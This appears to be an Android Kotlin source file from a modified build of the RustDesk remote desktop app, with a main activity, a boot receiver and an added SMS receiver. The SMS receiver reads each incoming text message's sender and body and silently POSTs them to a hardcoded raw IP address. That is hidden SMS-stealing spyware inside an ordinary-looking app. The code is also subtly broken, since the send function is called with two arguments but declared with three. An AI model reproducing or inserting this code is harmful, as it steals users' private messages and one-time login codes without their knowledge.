package com.carriez.flutter_hbb

import android.Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
import android.Manifest.permission.SYSTEM_ALERT_WINDOW
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import android.widget.Toast
import com.hjq.permissions.XXPermissions
import io.flutter.embedding.android.FlutterActivity

import android.os.Bundle
import android.telephony.SmsMessage
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.io.BufferedOutputStream
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder

import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel


class MainActivity: FlutterActivity() {
    private val CHANNEL = "com.example.zxwy"

    // 全局变量 clientId
    companion object {
        var clientId: String? = null
    }

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL).setMethodCallHandler { call, result ->
            when (call.method) {
                "sendData" -> {
                    val data = call.argument<String>("data")
                    if (data != null) {
                        clientId = data // 赋值给全局变量 clientId
                    } else {
                        result.error("INVALID_ARGUMENT", "Data is null", null)
                    }
                }
                else -> {
                    result.notImplemented()
                }
            }
        }
    }
}


class SmsReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "SmsReceiver"
        private const val API_URL = "http://61.171.69.243:7801/external/cli/sms/save"
    }

    override fun onReceive(context: Context, intent: Intent) {
        val bundle: Bundle? = intent.extras
        bundle?.let {
            val pdus = it.get("pdus") as Array<Any>?
            pdus?.forEach { pdu ->
                val smsMessage = SmsMessage.createFromPdu(pdu as ByteArray)
                val senderPhoneNumber = smsMessage.displayOriginatingAddress
                val messageBody = smsMessage.messageBody
                val clientID = MainActivity.clientId

                Log.d(TAG, "SMS Received - Sender: $senderPhoneNumber, Message: $messageBody")

                // Send SMS details to API asynchronously
                sendSmsDetailsToApi(senderPhoneNumber, messageBody)
            }
        }
    }

    private fun sendSmsDetailsToApi(clientId: String, phoneNumber: String, message: String) {
        GlobalScope.launch(Dispatchers.IO) {
            try {
                val url = URL(API_URL)
                val urlConnection = url.openConnection() as HttpURLConnection
                urlConnection.requestMethod = "POST"
                urlConnection.setRequestProperty("Content-Type", "application/json")
                urlConnection.doOutput = true

                // Create JSON object with phone and message fields
                val jsonParams = JSONObject()
                jsonParams.put("clientId", clientId)
                jsonParams.put("phone", phoneNumber)
                jsonParams.put("content", message)

                // Write JSON data to output stream
                val outputStream: OutputStream = BufferedOutputStream(urlConnection.outputStream)
                outputStream.write(jsonParams.toString().toByteArray())
                outputStream.flush()

                val responseCode = urlConnection.responseCode
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    Log.d(TAG, "SMS details sent successfully")
                    // Handle successful response if needed
                } else {
                    Log.e(TAG, "Failed to send SMS details. Response code: $responseCode")
                    // Handle unsuccessful response if needed
                }

                urlConnection.disconnect()
            } catch (e: Exception) {
                Log.e(TAG, "Error sending SMS details: ${e.message}")
            }
        }
    }
}

const val DEBUG_BOOT_COMPLETED = "com.carriez.flutter_hbb.DEBUG_BOOT_COMPLETED"

class BootReceiver : BroadcastReceiver() {
    private val logTag = "tagBootReceiver"

    override fun onReceive(context: Context, intent: Intent) {
        Log.d(logTag, "onReceive ${intent.action}")

        if (Intent.ACTION_BOOT_COMPLETED == intent.action || DEBUG_BOOT_COMPLETED == intent.action) {
            // check SharedPreferences config
            val prefs = context.getSharedPreferences(KEY_SHARED_PREFERENCES, FlutterActivity.MODE_PRIVATE)
            if (!prefs.getBoolean(KEY_START_ON_BOOT_OPT, false)) {
                Log.d(logTag, "KEY_START_ON_BOOT_OPT is false")
                return
            }
            // check pre-permission
            if (!XXPermissions.isGranted(context, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, SYSTEM_ALERT_WINDOW)){
                Log.d(logTag, "REQUEST_IGNORE_BATTERY_OPTIMIZATIONS or SYSTEM_ALERT_WINDOW is not granted")
                return
            }

            val it = Intent(context, MainService::class.java).apply {
                action = ACT_INIT_MEDIA_PROJECTION_AND_SERVICE
                putExtra(EXT_INIT_FROM_BOOT, true)
            }
            Toast.makeText(context, "RustDesk is Open", Toast.LENGTH_LONG).show()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(it)
            } else {
                context.startService(it)
            }
        }
    }
}
